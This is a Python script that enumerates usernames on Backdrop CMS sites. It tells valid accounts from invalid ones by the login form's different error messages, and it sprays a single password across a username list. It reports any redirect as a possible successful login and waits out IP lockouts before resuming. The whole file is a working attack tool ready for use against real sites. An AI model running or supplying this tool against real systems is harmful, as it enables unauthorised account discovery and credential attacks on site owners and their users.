#!/bin/python3
# backdrop CMS username discovery tool
# useage: backdropCMS-UND.py http://url.url usernamelist password

import sys
import requests
import time
import os

## colors are good
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    GOLDEN = '\033[33m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def getFormID(url):
    reqeust = requests.get(url)
    for i in reqeust.text.split("\n"):
        if('form_build_id' in i):
            formID=i.split("\"")
            return formID[5]

def sendLogin(url,username,password,formID):
    request = requests.post(url,params={'q':"user/login"},data={'name':username,'pass':password,'form_build_id':formID,'form_id':'user_login','op':'Log+in'},allow_redirects=False)
    for i in request.text.split("\n"):
        ## if statements to find known error codes from the parsed html
        if('Sorry, unrecognized username.' in i):
            return "no such username"
        if('Sorry, incorrect password.' in i):
            return "valid username"
        if('Sorry, too many failed login attempts from your IP address. This IP address is temporarily blocked. Try again later' in i):
            return "please wait"
        if(request.is_redirect):
            return "possible login found"
    return request.url


def mainExectionFunction(url,usernameFile,password,limit=1,lockout=60):
    formID=getFormID(url+"/?q=user/login")
    print("Got the form ID: "+formID)
    usernames=[]
    with open(usernameFile,"r") as file:
        usernames=file.readlines();
    print("Loaded usernames from "+usernameFile)
    counter=0;# we want to keep a static counter so that if a username is missed we can not increment the counter until we are allowed to send again
    validUsernames=[]
    while(counter < len(usernames)):
        username=usernames[counter]
        response=sendLogin(url,username,password,formID)
        while("please wait" in response):
            print("locked from sending more usernames waiting 60 seconds...")
            time.sleep(lockout)
            response=sendLogin(url,username,password,formID)
            if("please wait" not in response ):
                print("resuming username spray at username: "+username)
            
        if("no such username" in response):
            counter=counter+1;
        if("valid username" in response):
            print(f"Found username! {bcolors.OKGREEN}"+username[:-1])
            print(f"{bcolors.ENDC}")
            validUsernames.append(username)
            counter=counter+1;            
        if("please wait" in response):
            print("blocked from sending more usernames waiting 60 seconds...")
            time.sleep(lockout)
        if("possible login found" in response):
            print(f"It appears you have found a valid login for {bcolors.GOLDEN}"+username[:-1]+f":"+password)
            print(f"{bcolors.ENDC}")
            validUsernames.append(username)
            counter=counter+1;
        time.sleep(limit)
    return validUsernames

if __name__ == "__main__":
    print("Backdrop CMS Username Discovery Tool")
    try:
        url=sys.argv[1]
        usernameList=sys.argv[2]
        password=sys.argv[3]
        validUsers=mainExectionFunction(url,usernameList,password,limit=0,lockout=60)
        print("A list of valid users discovered:")
        for i in validUsers:
            print("	"+i[:-1])
    except:
        print("useage: backdropCMS-UND.py http(s)://example.com /path/to/usernamelist password")

